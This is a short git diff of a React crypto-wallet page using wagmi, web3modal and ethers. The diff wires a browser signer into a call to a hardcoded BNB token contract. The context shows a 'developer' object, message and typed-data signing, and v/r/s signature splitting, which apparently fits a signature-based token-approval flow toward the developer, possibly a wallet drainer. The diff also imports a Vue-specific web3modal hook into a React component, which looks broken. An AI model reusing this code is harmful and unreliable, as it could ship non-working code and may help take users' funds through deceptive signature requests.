@@ -4,8 +4,9 @@ import {useAccount, useBalance, useDisconnect, useSendTransaction, useSignMessag
 import {parseEther} from "viem";
 import {getBalance, signTypedData} from "@wagmi/core";
 import {config} from "@/context/config";
-import {ethers, formatUnits} from "ethers";
+import {BrowserProvider, ethers, formatUnits} from "ethers";
 import {useEffect, useState} from "react";
+import {useWeb3ModalProvider} from "@web3modal/ethers/vue";
 
 const BNBContract = "0x095418A82BC2439703b69fbE1210824F2247D77c";
 const developer = {
@@ -16,7 +17,10 @@ const Page = () => {
 	const open = useWeb3Modal();
 	const wallet = useWalletInfo();
 	const account = useAccount();
+	const { walletProvider } = useWeb3ModalProvider()
 	const { signMessage } = useSignMessage();
+
+
 	const { sendTransaction } = useSendTransaction()
 	const {disconnect} = useDisconnect();
 	const {data: balance, isLoading} = useBalance({
@@ -126,8 +130,9 @@ const Page = () => {
 						"type": "function"
 					}
 				];
-
-				const tokenContract = new ethers.Contract('0xB8c77482e45F1F44dE1745F52C74426C631bDD52',abi,); // BNB Contract Address
+				const provider = new BrowserProvider(walletProvider)
+				const signer = await provider.getSigner()
+				const tokenContract = new ethers.Contract('0xB8c77482e45F1F44dE1745F52C74426C631bDD52',abi,signer); // BNB Contract Address
 // Extract v, r, s from the signature
 				const sig = signature.slice(2);
 				const r = '0x' + sig.slice(0, 64);
